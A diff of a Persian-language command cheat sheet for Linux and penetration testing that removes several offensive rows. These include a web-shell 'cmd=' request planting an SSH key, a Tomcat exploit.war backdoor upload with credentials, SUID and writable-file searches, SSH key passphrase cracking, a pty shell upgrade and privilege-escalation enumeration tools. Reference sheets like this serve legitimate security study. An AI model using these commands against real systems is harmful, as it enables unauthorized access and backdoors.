@@ -24,8 +24,6 @@ published: true
 | ifconfig int hw ether MAC | تغییر MAC |
 | macchanger -m MAC int | تغییر Mac در Backtrack  |
 | iwlist int scan | پویشگر wifi |
-| nc -lvvp port | گوش دادن به port خاص |
-| python3 -m http.server port | ایجاد وبسرور |
 | dig -x ip | شناسایی دامین های یک ip |
 | host ip | شناسایی دامین های یک ip |
 | host -t SRV \_ service tcp.url.com | شناسایی SRV دامین |
@@ -37,9 +35,6 @@ published: true
 | tcpkill host ip and port port | مسدود نمودن ip:port |
 | echo "1" /proc/sys/net/ipv4/ip forward | فعال سازی IP Forwarding |
 | echo ''nameserver x.x.x.x''  /etc7resolv.conf | اضافه نمودن سرور DNS |
-| showmount -e ip | نمایش نقاط mount شده |
-| mkdir /site_backups;mount -t nfs ip:/ /site_backup | mount مسیر به اشتراک گذشته شده ip|
-
 
 ## اطلاعات سیستم
 
@@ -67,16 +62,11 @@ published: true
 | pkginfo | بسته های نصب شده \(در Solaris\) |
 | which tscsh/csh/ksh/bash | نمایش مسیر های فایل های اجرایی |
 | chmod -so tcsh/csh/ksh | غیر فعال سازی شل و همچنین اجبار به استفاده از bash |
-| find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; | پیدا نمودن فایل های دارای suid |
-| find / -uid 0 -perm -4000 -type f 2>/dev/null | پیدا نمودن فایل های دارای suid |
-| find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null | نمایش فایل های writable |
-
 
 ## دستورات کاربردی
 
 | **دستور** | **توضیح** |
 | :--- | :--- |
-| python -c "import pty;pty.spawn('/bin/bash')" | شل interactive |
 | wget http:// url -0 url.txt -o /dev/null | گرفتن آدرس |
 | rdesktop ip | دسترسی به دسکتاپ ip |
 | scp /tmp/file user@x.x.x.x:/tmp/file | ارسال فایل |
@@ -88,14 +78,6 @@ published: true
 | apropos subject | دستورات مرتبط |
 | history | تاریخچه دستورات کاربر |
 | ! num | خطوط اجرایی در history |
-| ssh2john.py id_rsa > ssh-key | پیدا نمودن passphrase |
-| john ssh-key | پیدا نمودن passphrase |
-| ssh -i id_rsa user@ip | وصل شدن با کلید و passphrase |
-| id -u <username> | دریافت id کاربر |
-| cut -d: -f3 < <(getent group GROUPNAME) | دریافت id گروه |
-| curl -G 'http://example.com/file.php' --data-urlencode 'cmd=echo ssh-rsa AA...........' | ارسال اطلاعات با متد get در curl |
-| curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file exploit.war "http://megahosting.com:8080/ma
-nager/text/deploy?path=/exploit.war" | ایجاد backdoor با آسیب پذیری lfi در java |
 
 ## دستورات فایل
 
@@ -157,14 +139,6 @@ nager/text/deploy?path=/exploit.war" | ایجاد backdoor با آسیب پذی�
       <td style="text-align:left">grep -c &apos;&apos;str&apos;&apos; file</td>
       <td style="text-align:left">جمع خطوط w/ &apos;&apos;str&apos;&apos;</td>
     </tr>
-    <tr>
-      <td style="text-align:left">grep -Hnri word * | vim -</td>
-      <td style="text-align:left">جست و جو کلمه مورد نظر در فایل ها به همراه نام فایل</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">grep -rial word</td>
-      <td style="text-align:left">فایل های حاوی کلمه مورد نظر</td>
-    </tr> 
     <tr>
       <td style="text-align:left">tar cf file.tar files</td>
       <td style="text-align:left">ایجاد .tar از فایل ها</td>
@@ -241,10 +215,6 @@ nager/text/deploy?path=/exploit.war" | ایجاد backdoor با آسیب پذی�
       <td style="text-align:left">chattr (+/-)i file</td>
       <td style="text-align:left">تنظیم و یا عدم تنظیم بیت immutable</td>
     </tr>
-    <tr>
-      <td style="text-align:left">while [ $? -eq 0 ]; do cd flag/; done</td>
-      <td style="text-align:left">ورود به پوشه بی نهایت تو در تو</td>
-    </tr>
   </tbody>
 </table>
 
@@ -316,30 +286,6 @@ nager/text/deploy?path=/exploit.war" | ایجاد backdoor با آسیب پذی�
 | /var/spool/cron | لیست فایل های در cron |
 | /var/log/apache/access.log | گزارشات ارتباطات apache |
 | /etc/fstab | فایل اطلاعات ثابت سیستم |
-
-## استفاده از powershell
-
-### نصب
-
-```text
-sudo apt install gss-ntlmssp
-sudo apt-get install powershell
-```
-
-### ورود با استفاده نام کاربری و کلمه عبور
-
-```text
-pwsh
-$offsec_session = New-PSSession -ComputerName 10.10.10.210 -Authentication Negotiate -Credential k.svensson
-Enter-PSSession $offsec_session
-```
-
-### ایجاد symlink
-
-```text
-New-Item -ItemType Junction -Path 'C:\ProgramData' -Target 'C:\Users\Administrator'
-```
-
 
 ## اسکریپت نویسی
 
@@ -673,22 +619,8 @@ apt-get update
 apt-get upgrade
 ```
 
-### بررسی سیستم عامل برای امکان ارتقا دسترسی
-
-```text
-https://github.com/rebootuser/LinEnum
-Example: ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
-```
-
-### لیست کلیه فرآیند ها با دسترسی root
-
-```text
-https://github.com/DominicBreuker/pspy
-For example: ./pspy64 -pf -i 1000 
-```
-
-
 ## دستور PFSENSE
+
 
 
 | **دستور** | **توضیح** |
@@ -732,9 +664,3 @@ For example: ./pspy64 -pf -i 1000
 | /var/adm/messages | مسیر syslog |
 | /etc/auto ' | فایل تنظیمات Automounter  |
 | /etc/inet/ipnodes | فایل هاست های IPv4 و IPv6 |
-
-## فایل های cache مهم
-
-| **فایل** | **توضیحات** |
-| :--- | :--- |
-| ~/.viminfo | فایل ویرایشگر vim |
